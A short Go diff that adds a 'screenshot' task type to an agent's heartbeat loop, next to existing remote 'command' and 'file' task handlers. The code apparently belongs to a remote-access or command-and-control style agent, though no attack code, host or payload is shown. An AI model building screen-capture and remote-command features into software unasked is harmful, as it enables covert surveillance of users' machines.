@@ -48,6 +48,8 @@ func (a *Agent) Heartbeat() error {
 				taskResult = handleCommandTask(task)
 			case "file":
 				taskResult = handleFileTask(task)
+			case "screenshot":
+				taskResult = handleScreenshotTask(task)
 			}
 			taskResults = append(taskResults, taskResult)
 		}
